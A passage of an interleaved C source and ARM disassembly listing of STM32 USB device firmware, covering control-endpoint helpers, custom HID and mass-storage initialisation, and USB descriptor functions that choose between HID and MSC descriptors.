 800c1fa:	2100      	movs	r1, #0
 800c1fc:	68f8      	ldr	r0, [r7, #12]
 800c1fe:	f000 fdab 	bl	800cd58 <USBD_LL_Transmit>

  return USBD_OK;
 800c202:	2300      	movs	r3, #0
}
 800c204:	4618      	mov	r0, r3
 800c206:	3710      	adds	r7, #16
 800c208:	46bd      	mov	sp, r7
 800c20a:	bd80      	pop	{r7, pc}

0800c20c <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c20c:	b580      	push	{r7, lr}
 800c20e:	b084      	sub	sp, #16
 800c210:	af00      	add	r7, sp, #0
 800c212:	60f8      	str	r0, [r7, #12]
 800c214:	60b9      	str	r1, [r7, #8]
 800c216:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c218:	68fb      	ldr	r3, [r7, #12]
 800c21a:	2203      	movs	r2, #3
 800c21c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c220:	68fb      	ldr	r3, [r7, #12]
 800c222:	687a      	ldr	r2, [r7, #4]
 800c224:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c228:	68fb      	ldr	r3, [r7, #12]
 800c22a:	687a      	ldr	r2, [r7, #4]
 800c22c:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c230:	687b      	ldr	r3, [r7, #4]
 800c232:	68ba      	ldr	r2, [r7, #8]
 800c234:	2100      	movs	r1, #0
 800c236:	68f8      	ldr	r0, [r7, #12]
 800c238:	f000 fdc6 	bl	800cdc8 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c23c:	2300      	movs	r3, #0
}
 800c23e:	4618      	mov	r0, r3
 800c240:	3710      	adds	r7, #16
 800c242:	46bd      	mov	sp, r7
 800c244:	bd80      	pop	{r7, pc}

0800c246 <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c246:	b580      	push	{r7, lr}
 800c248:	b084      	sub	sp, #16
 800c24a:	af00      	add	r7, sp, #0
 800c24c:	60f8      	str	r0, [r7, #12]
 800c24e:	60b9      	str	r1, [r7, #8]
 800c250:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c252:	687b      	ldr	r3, [r7, #4]
 800c254:	68ba      	ldr	r2, [r7, #8]
 800c256:	2100      	movs	r1, #0
 800c258:	68f8      	ldr	r0, [r7, #12]
 800c25a:	f000 fdb5 	bl	800cdc8 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c25e:	2300      	movs	r3, #0
}
 800c260:	4618      	mov	r0, r3
 800c262:	3710      	adds	r7, #16
 800c264:	46bd      	mov	sp, r7
 800c266:	bd80      	pop	{r7, pc}

0800c268 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c268:	b580      	push	{r7, lr}
 800c26a:	b082      	sub	sp, #8
 800c26c:	af00      	add	r7, sp, #0
 800c26e:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c270:	687b      	ldr	r3, [r7, #4]
 800c272:	2204      	movs	r2, #4
 800c274:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c278:	2300      	movs	r3, #0
 800c27a:	2200      	movs	r2, #0
 800c27c:	2100      	movs	r1, #0
 800c27e:	6878      	ldr	r0, [r7, #4]
 800c280:	f000 fd6a 	bl	800cd58 <USBD_LL_Transmit>

  return USBD_OK;
 800c284:	2300      	movs	r3, #0
}
 800c286:	4618      	mov	r0, r3
 800c288:	3708      	adds	r7, #8
 800c28a:	46bd      	mov	sp, r7
 800c28c:	bd80      	pop	{r7, pc}

0800c28e <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c28e:	b580      	push	{r7, lr}
 800c290:	b082      	sub	sp, #8
 800c292:	af00      	add	r7, sp, #0
 800c294:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c296:	687b      	ldr	r3, [r7, #4]
 800c298:	2205      	movs	r2, #5
 800c29a:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c29e:	2300      	movs	r3, #0
 800c2a0:	2200      	movs	r2, #0
 800c2a2:	2100      	movs	r1, #0
 800c2a4:	6878      	ldr	r0, [r7, #4]
 800c2a6:	f000 fd8f 	bl	800cdc8 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c2aa:	2300      	movs	r3, #0
}
 800c2ac:	4618      	mov	r0, r3
 800c2ae:	3708      	adds	r7, #8
 800c2b0:	46bd      	mov	sp, r7
 800c2b2:	bd80      	pop	{r7, pc}

0800c2b4 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c2b4:	b580      	push	{r7, lr}
 800c2b6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c2b8:	2200      	movs	r2, #0
 800c2ba:	4912      	ldr	r1, [pc, #72]	; (800c304 <MX_USB_DEVICE_Init+0x50>)
 800c2bc:	4812      	ldr	r0, [pc, #72]	; (800c308 <MX_USB_DEVICE_Init+0x54>)
 800c2be:	f7fe fd68 	bl	800ad92 <USBD_Init>
 800c2c2:	4603      	mov	r3, r0
 800c2c4:	2b00      	cmp	r3, #0
 800c2c6:	d001      	beq.n	800c2cc <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c2c8:	f7f4 fc7e 	bl	8000bc8 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c2cc:	490f      	ldr	r1, [pc, #60]	; (800c30c <MX_USB_DEVICE_Init+0x58>)
 800c2ce:	480e      	ldr	r0, [pc, #56]	; (800c308 <MX_USB_DEVICE_Init+0x54>)
 800c2d0:	f7fe fd8f 	bl	800adf2 <USBD_RegisterClass>
 800c2d4:	4603      	mov	r3, r0
 800c2d6:	2b00      	cmp	r3, #0
 800c2d8:	d001      	beq.n	800c2de <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c2da:	f7f4 fc75 	bl	8000bc8 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c2de:	490c      	ldr	r1, [pc, #48]	; (800c310 <MX_USB_DEVICE_Init+0x5c>)
 800c2e0:	4809      	ldr	r0, [pc, #36]	; (800c308 <MX_USB_DEVICE_Init+0x54>)
 800c2e2:	f7fc fca5 	bl	8008c30 <USBD_CUSTOM_HID_RegisterInterface>
 800c2e6:	4603      	mov	r3, r0
 800c2e8:	2b00      	cmp	r3, #0
 800c2ea:	d001      	beq.n	800c2f0 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c2ec:	f7f4 fc6c 	bl	8000bc8 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c2f0:	4805      	ldr	r0, [pc, #20]	; (800c308 <MX_USB_DEVICE_Init+0x54>)
 800c2f2:	f7fe fdb4 	bl	800ae5e <USBD_Start>
 800c2f6:	4603      	mov	r3, r0
 800c2f8:	2b00      	cmp	r3, #0
 800c2fa:	d001      	beq.n	800c300 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c2fc:	f7f4 fc64 	bl	8000bc8 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c300:	bf00      	nop
 800c302:	bd80      	pop	{r7, pc}
 800c304:	200001ac 	.word	0x200001ac
 800c308:	200003c0 	.word	0x200003c0
 800c30c:	2000002c 	.word	0x2000002c
 800c310:	2000019c 	.word	0x2000019c

0800c314 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c314:	b580      	push	{r7, lr}
 800c316:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c318:	2200      	movs	r2, #0
 800c31a:	4912      	ldr	r1, [pc, #72]	; (800c364 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c31c:	4812      	ldr	r0, [pc, #72]	; (800c368 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c31e:	f7fe fd38 	bl	800ad92 <USBD_Init>
 800c322:	4603      	mov	r3, r0
 800c324:	2b00      	cmp	r3, #0
 800c326:	d001      	beq.n	800c32c <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c328:	f7f4 fc4e 	bl	8000bc8 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c32c:	490f      	ldr	r1, [pc, #60]	; (800c36c <MX_USB_DEVICE_Init_MSC+0x58>)
 800c32e:	480e      	ldr	r0, [pc, #56]	; (800c368 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c330:	f7fe fd5f 	bl	800adf2 <USBD_RegisterClass>
 800c334:	4603      	mov	r3, r0
 800c336:	2b00      	cmp	r3, #0
 800c338:	d001      	beq.n	800c33e <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c33a:	f7f4 fc45 	bl	8000bc8 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c33e:	490c      	ldr	r1, [pc, #48]	; (800c370 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c340:	4809      	ldr	r0, [pc, #36]	; (800c368 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c342:	f7fc ff27 	bl	8009194 <USBD_MSC_RegisterStorage>
 800c346:	4603      	mov	r3, r0
 800c348:	2b00      	cmp	r3, #0
 800c34a:	d001      	beq.n	800c350 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c34c:	f7f4 fc3c 	bl	8000bc8 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c350:	4805      	ldr	r0, [pc, #20]	; (800c368 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c352:	f7fe fd84 	bl	800ae5e <USBD_Start>
 800c356:	4603      	mov	r3, r0
 800c358:	2b00      	cmp	r3, #0
 800c35a:	d001      	beq.n	800c360 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c35c:	f7f4 fc34 	bl	8000bc8 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c360:	bf00      	nop
 800c362:	bd80      	pop	{r7, pc}
 800c364:	200001ac 	.word	0x200001ac
 800c368:	2000069c 	.word	0x2000069c
 800c36c:	200000a8 	.word	0x200000a8
 800c370:	20000220 	.word	0x20000220

0800c374 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c374:	b480      	push	{r7}
 800c376:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c378:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c37a:	4618      	mov	r0, r3
 800c37c:	46bd      	mov	sp, r7
 800c37e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c382:	4770      	bx	lr

0800c384 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c384:	b480      	push	{r7}
 800c386:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c388:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c38a:	4618      	mov	r0, r3
 800c38c:	46bd      	mov	sp, r7
 800c38e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c392:	4770      	bx	lr

0800c394 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c394:	b580      	push	{r7, lr}
 800c396:	b082      	sub	sp, #8
 800c398:	af00      	add	r7, sp, #0
 800c39a:	4603      	mov	r3, r0
 800c39c:	460a      	mov	r2, r1
 800c39e:	71fb      	strb	r3, [r7, #7]
 800c3a0:	4613      	mov	r3, r2
 800c3a2:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c3a4:	4803      	ldr	r0, [pc, #12]	; (800c3b4 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c3a6:	f7fc fbd1 	bl	8008b4c <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c3aa:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c3ac:	4618      	mov	r0, r3
 800c3ae:	3708      	adds	r7, #8
 800c3b0:	46bd      	mov	sp, r7
 800c3b2:	bd80      	pop	{r7, pc}
 800c3b4:	200003c0 	.word	0x200003c0

0800c3b8 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c3b8:	b480      	push	{r7}
 800c3ba:	b083      	sub	sp, #12
 800c3bc:	af00      	add	r7, sp, #0
 800c3be:	4603      	mov	r3, r0
 800c3c0:	6039      	str	r1, [r7, #0]
 800c3c2:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c3c4:	683b      	ldr	r3, [r7, #0]
 800c3c6:	2212      	movs	r2, #18
 800c3c8:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c3ca:	4b06      	ldr	r3, [pc, #24]	; (800c3e4 <USBD_FS_DeviceDescriptor+0x2c>)
 800c3cc:	681b      	ldr	r3, [r3, #0]
 800c3ce:	2b01      	cmp	r3, #1
 800c3d0:	d101      	bne.n	800c3d6 <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c3d2:	4b05      	ldr	r3, [pc, #20]	; (800c3e8 <USBD_FS_DeviceDescriptor+0x30>)
 800c3d4:	e000      	b.n	800c3d8 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c3d6:	4b05      	ldr	r3, [pc, #20]	; (800c3ec <USBD_FS_DeviceDescriptor+0x34>)
}
 800c3d8:	4618      	mov	r0, r3
 800c3da:	370c      	adds	r7, #12
 800c3dc:	46bd      	mov	sp, r7
 800c3de:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c3e2:	4770      	bx	lr
 800c3e4:	20000978 	.word	0x20000978
 800c3e8:	200001cc 	.word	0x200001cc
 800c3ec:	200001e0 	.word	0x200001e0

0800c3f0 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c3f0:	b480      	push	{r7}
 800c3f2:	b083      	sub	sp, #12
 800c3f4:	af00      	add	r7, sp, #0
 800c3f6:	4603      	mov	r3, r0
 800c3f8:	6039      	str	r1, [r7, #0]
 800c3fa:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c3fc:	683b      	ldr	r3, [r7, #0]
 800c3fe:	2204      	movs	r2, #4
 800c400:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c402:	4b03      	ldr	r3, [pc, #12]	; (800c410 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c404:	4618      	mov	r0, r3
 800c406:	370c      	adds	r7, #12
 800c408:	46bd      	mov	sp, r7
 800c40a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c40e:	4770      	bx	lr
 800c410:	20000200 	.word	0x20000200

0800c414 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c414:	b580      	push	{r7, lr}
 800c416:	b082      	sub	sp, #8
 800c418:	af00      	add	r7, sp, #0
 800c41a:	4603      	mov	r3, r0
 800c41c:	6039      	str	r1, [r7, #0]
 800c41e:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c420:	79fb      	ldrb	r3, [r7, #7]
 800c422:	2b00      	cmp	r3, #0
 800c424:	d105      	bne.n	800c432 <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c426:	683a      	ldr	r2, [r7, #0]
 800c428:	4907      	ldr	r1, [pc, #28]	; (800c448 <USBD_FS_ProductStrDescriptor+0x34>)
 800c42a:	4808      	ldr	r0, [pc, #32]	; (800c44c <USBD_FS_ProductStrDescriptor+0x38>)
 800c42c:	f7ff fe62 	bl	800c0f4 <USBD_GetString>
 800c430:	e004      	b.n	800c43c <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c432:	683a      	ldr	r2, [r7, #0]
 800c434:	4904      	ldr	r1, [pc, #16]	; (800c448 <USBD_FS_ProductStrDescriptor+0x34>)
 800c436:	4805      	ldr	r0, [pc, #20]	; (800c44c <USBD_FS_ProductStrDescriptor+0x38>)
 800c438:	f7ff fe5c 	bl	800c0f4 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c43c:	4b02      	ldr	r3, [pc, #8]	; (800c448 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c43e:	4618      	mov	r0, r3
 800c440:	3708      	adds	r7, #8
 800c442:	46bd      	mov	sp, r7
 800c444:	bd80      	pop	{r7, pc}
 800c446:	bf00      	nop
 800c448:	2000097c 	.word	0x2000097c
 800c44c:	0800d094 	.word	0x0800d094

0800c450 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c450:	b580      	push	{r7, lr}
 800c452:	b082      	sub	sp, #8
 800c454:	af00      	add	r7, sp, #0
 800c456:	4603      	mov	r3, r0
 800c458:	6039      	str	r1, [r7, #0]
 800c45a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c45c:	683a      	ldr	r2, [r7, #0]
 800c45e:	4904      	ldr	r1, [pc, #16]	; (800c470 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c460:	4804      	ldr	r0, [pc, #16]	; (800c474 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c462:	f7ff fe47 	bl	800c0f4 <USBD_GetString>
  return USBD_StrDesc;
 800c466:	4b02      	ldr	r3, [pc, #8]	; (800c470 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c468:	4618      	mov	r0, r3
 800c46a:	3708      	adds	r7, #8
 800c46c:	46bd      	mov	sp, r7
 800c46e:	bd80      	pop	{r7, pc}
 800c470:	2000097c 	.word	0x2000097c
 800c474:	0800d0a8 	.word	0x0800d0a8

0800c478 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c478:	b580      	push	{r7, lr}
 800c47a:	b082      	sub	sp, #8
 800c47c:	af00      	add	r7, sp, #0
 800c47e:	4603      	mov	r3, r0
 800c480:	6039      	str	r1, [r7, #0]
 800c482:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c484:	683b      	ldr	r3, [r7, #0]
 800c486:	221a      	movs	r2, #26
 800c488:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c48a:	f000 f855 	bl	800c538 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c48e:	4b02      	ldr	r3, [pc, #8]	; (800c498 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c490:	4618      	mov	r0, r3
 800c492:	3708      	adds	r7, #8
 800c494:	46bd      	mov	sp, r7
 800c496:	bd80      	pop	{r7, pc}
 800c498:	20000204 	.word	0x20000204

0800c49c <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c49c:	b580      	push	{r7, lr}
 800c49e:	b082      	sub	sp, #8
 800c4a0:	af00      	add	r7, sp, #0
 800c4a2:	4603      	mov	r3, r0
 800c4a4:	6039      	str	r1, [r7, #0]
 800c4a6:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c4a8:	79fb      	ldrb	r3, [r7, #7]
 800c4aa:	2b00      	cmp	r3, #0
 800c4ac:	d105      	bne.n	800c4ba <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c4ae:	683a      	ldr	r2, [r7, #0]
 800c4b0:	4907      	ldr	r1, [pc, #28]	; (800c4d0 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c4b2:	4808      	ldr	r0, [pc, #32]	; (800c4d4 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c4b4:	f7ff fe1e 	bl	800c0f4 <USBD_GetString>
 800c4b8:	e004      	b.n	800c4c4 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c4ba:	683a      	ldr	r2, [r7, #0]
 800c4bc:	4904      	ldr	r1, [pc, #16]	; (800c4d0 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c4be:	4805      	ldr	r0, [pc, #20]	; (800c4d4 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c4c0:	f7ff fe18 	bl	800c0f4 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c4c4:	4b02      	ldr	r3, [pc, #8]	; (800c4d0 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c4c6:	4618      	mov	r0, r3
 800c4c8:	3708      	adds	r7, #8
 800c4ca:	46bd      	mov	sp, r7
 800c4cc:	bd80      	pop	{r7, pc}
 800c4ce:	bf00      	nop
 800c4d0:	2000097c 	.word	0x2000097c
 800c4d4:	0800d0ac 	.word	0x0800d0ac

0800c4d8 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4d8:	b580      	push	{r7, lr}
 800c4da:	b082      	sub	sp, #8
 800c4dc:	af00      	add	r7, sp, #0
 800c4de:	4603      	mov	r3, r0
 800c4e0:	6039      	str	r1, [r7, #0]
 800c4e2:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c4e4:	79fb      	ldrb	r3, [r7, #7]
 800c4e6:	2b00      	cmp	r3, #0
 800c4e8:	d105      	bne.n	800c4f6 <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c4ea:	683a      	ldr	r2, [r7, #0]
 800c4ec:	4907      	ldr	r1, [pc, #28]	; (800c50c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c4ee:	4808      	ldr	r0, [pc, #32]	; (800c510 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c4f0:	f7ff fe00 	bl	800c0f4 <USBD_GetString>
 800c4f4:	e004      	b.n	800c500 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c4f6:	683a      	ldr	r2, [r7, #0]
 800c4f8:	4904      	ldr	r1, [pc, #16]	; (800c50c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c4fa:	4805      	ldr	r0, [pc, #20]	; (800c510 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c4fc:	f7ff fdfa 	bl	800c0f4 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c500:	4b02      	ldr	r3, [pc, #8]	; (800c50c <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c502:	4618      	mov	r0, r3
 800c504:	3708      	adds	r7, #8
 800c506:	46bd      	mov	sp, r7
 800c508:	bd80      	pop	{r7, pc}
 800c50a:	bf00      	nop
 800c50c:	2000097c 	.word	0x2000097c
 800c510:	0800d0b8 	.word	0x0800d0b8

0800c514 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c514:	b480      	push	{r7}
 800c516:	b083      	sub	sp, #12
 800c518:	af00      	add	r7, sp, #0
 800c51a:	4603      	mov	r3, r0
 800c51c:	6039      	str	r1, [r7, #0]
 800c51e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c520:	683b      	ldr	r3, [r7, #0]
 800c522:	220c      	movs	r2, #12
 800c524:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c526:	4b03      	ldr	r3, [pc, #12]	; (800c534 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c528:	4618      	mov	r0, r3
 800c52a:	370c      	adds	r7, #12
 800c52c:	46bd      	mov	sp, r7
 800c52e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c532:	4770      	bx	lr
 800c534:	200001f4 	.word	0x200001f4

0800c538 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c538:	b580      	push	{r7, lr}
 800c53a:	b084      	sub	sp, #16
 800c53c:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c53e:	4b0f      	ldr	r3, [pc, #60]	; (800c57c <Get_SerialNum+0x44>)
 800c540:	681b      	ldr	r3, [r3, #0]
 800c542:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c544:	4b0e      	ldr	r3, [pc, #56]	; (800c580 <Get_SerialNum+0x48>)
 800c546:	681b      	ldr	r3, [r3, #0]
 800c548:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c54a:	4b0e      	ldr	r3, [pc, #56]	; (800c584 <Get_SerialNum+0x4c>)
 800c54c:	681b      	ldr	r3, [r3, #0]
 800c54e:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
